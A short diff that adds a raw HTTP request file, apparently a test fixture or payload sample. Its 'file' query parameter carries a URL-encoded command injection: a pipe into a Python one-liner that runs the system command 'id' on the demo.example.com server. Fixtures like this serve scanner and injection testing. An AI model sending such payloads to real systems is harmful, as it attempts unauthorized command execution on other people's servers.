@@ -1,0 +1,4 @@
+GET /a?file=%7C%2Bpython%2B-c%2B%22import%2Bos%3B%2Bos.system%28%27id%27%29%22 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
